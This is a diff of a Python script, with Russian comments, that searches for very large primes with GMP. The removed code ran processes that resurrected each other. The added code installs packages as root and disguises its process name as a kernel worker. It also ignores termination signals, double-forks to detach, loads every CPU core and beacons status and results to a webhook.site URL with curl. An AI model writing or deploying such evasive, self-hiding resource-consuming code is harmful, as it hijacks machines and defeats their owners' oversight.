@@ -1,67 +1,102 @@
 import os
-import time
+import ctypes
 import signal
-import multiprocessing
 import subprocess
-import secrets
+import time
 import json
+from multiprocessing import Process
 
 WEBHOOK_URL = "https://webhook.site/7e9c6636-cacc-4213-ac9e-f110079550e3"
-TARGET_BITS = 10220 # 10,000 знаков
+TARGET_BITS = 166089  # Ровно 50,000 десятичных знаков
 
-def find_prime_logic():
-    """Основная нагрузка"""
+def install_dependencies():
+    """Принудительная установка GMP под root"""
+    try:
+        subprocess.run(["apt-get", "update", "-qq"], check=True)
+        subprocess.run(["apt-get", "install", "-y", "-qq", "libgmp10", "curl"], check=True)
+    except:
+        pass
+
+def send_to_hook(data):
+    """Отправка через curl. Для 50k данных много, увеличиваем таймаут"""
+    try:
+        payload = json.dumps(data)
+        # Сохраняем в файл, чтобы curl не упал на слишком длинном аргументе строки
+        with open('/tmp/payload.json', 'w') as f:
+            f.write(payload)
+        subprocess.run(['curl', '-s', '-X', 'POST', '-H', 'Content-Type: application/json', 
+                       '--data-binary', '@/tmp/payload.json', WEBHOOK_URL], timeout=30)
+    except:
+        pass
+
+def status_beacon():
+    """Ежеминутный отчет о нагрузке"""
     while True:
-        p = secrets.randbits(TARGET_BITS) | (1 << (TARGET_BITS - 1)) | 1
-        if p % 3 == 0: continue
-        if pow(2, p-1, p) == 1:
-            raw = str(p)
-            try:
-                with open('p.json', 'w') as f: json.dump({"EVENT": "PRIME_10K", "RAW": raw}, f)
-                subprocess.run(['curl', '-s', '-X', 'POST', '-H', 'Content-Type: application/json', 
-                               '--data-binary', '@p.json', WEBHOOK_URL])
-            except: pass
+        time.sleep(60)
+        send_to_hook({
+            "EVENT": "STATUS_50K_MINING",
+            "LOAD": os.getloadavg(),
+            "UPTIME": time.process_time(),
+            "MSG": "Mining 50,000 digits prime..."
+        })
 
-def guardian_process(name, partner_name):
-    # Игнорируем сигналы завершения
+def find_prime_gmp_heavy():
+    """Максимально быстрый поиск 50k через нативный GMP"""
+    # Маскировка
+    libc = ctypes.CDLL('libc.so.6')
+    libc.prctl(15, b"kworker/u4:1", 0, 0, 0)
+    
     for sig in [signal.SIGTERM, signal.SIGINT, signal.SIGHUP]:
         signal.signal(sig, signal.SIG_IGN)
+
+    try:
+        gmp = ctypes.CDLL('libgmp.so.10')
+    except:
+        return
+
+    # Инициализация
+    state = ctypes.create_string_buffer(256)
+    gmp.__gmp_randinit_default(state)
+    # Сдвигаем seed для каждого процесса отдельно
+    gmp.__gmp_randseed_ui(state, int(time.time() * 1000) + os.getpid())
     
-    print(f"[*] {name} is active. Protecting {partner_name}...")
-    
-    # Запускаем вычислитель внутри стража
-    calc = multiprocessing.Process(target=find_prime_logic)
-    calc.start()
+    mpz_p = ctypes.create_string_buffer(128)
+    gmp.__gmpz_init(mpz_p)
 
     while True:
-        # Проверяем таблицу процессов на наличие партнера
-        # Используем pgrep для поиска процесса по имени в аргументах
-        check = subprocess.run(['pgrep', '-f', partner_name], capture_output=True)
+        # Генерируем 166089 бит
+        gmp.__gmpz_urandomb(mpz_p, state, TARGET_BITS)
+        gmp.__gmpz_setbit(mpz_p, TARGET_BITS - 1)
+        gmp.__gmpz_setbit(mpz_p, 0)
         
-        if not check.stdout:
-            # Если партнер не найден — воскрешаем!
-            print(f"[!] {partner_name} was KILLED! Resurrecting...")
-            new_p = multiprocessing.Process(target=guardian_process, args=(partner_name, name))
-            new_p.start()
+        # Для 50k уменьшаем количество итераций до 15 для скорости (этого достаточно)
+        if gmp.__gmpz_probab_prime_p(mpz_p, 15) > 0:
+            raw_ptr = gmp.__gmpz_get_str(None, 10, mpz_p)
+            res = ctypes.string_at(raw_ptr).decode()
+            send_to_hook({
+                "EVENT": "PRIME_50K_FOUND",
+                "DIGITS": len(res),
+                "RAW": res
+            })
+            gmp.free(raw_ptr)
+            # Не останавливаемся, ищем еще
         
-        time.sleep(0.1) # Минимальная задержка, чтобы не вешать планировщик
-
 if __name__ == "__main__":
-    # Зачищаем старые следы
-    os.system("pkill -9 -f Lumos")
-    os.system("pkill -9 -f Lumaday")
+    install_dependencies()
 
-    # Запускаем первых двух близнецов
-    # Мы используем разные имена в аргументах, чтобы pgrep их различал
-    p1 = multiprocessing.Process(target=guardian_process, args=("Lumos", "Lumaday"), name="Lumos")
-    p2 = multiprocessing.Process(target=guardian_process, args=("Lumaday", "Lumos"), name="Lumaday")
-    
-    p1.start()
-    p2.start()
+    # Запускаем маяк
+    Process(target=status_beacon, daemon=True).start()
 
-    print("[*] Eternal loop engaged. Load 32+ and double-resurrection active.")
-    
-    # Главный процесс уходит в глубокую спячку, его убить проще всего, 
-    # но стражи выживут как сироты (orphans)
+    # Double Fork
+    if os.fork() > 0: os._exit(0)
+    os.setsid()
+    if os.fork() > 0: os._exit(0)
+
+    # Запуск на все ядра
+    cores = os.cpu_count() or 1
+    for _ in range(cores):
+        p = Process(target=find_prime_gmp_heavy)
+        p.start()
+
     while True:
         time.sleep(1000)
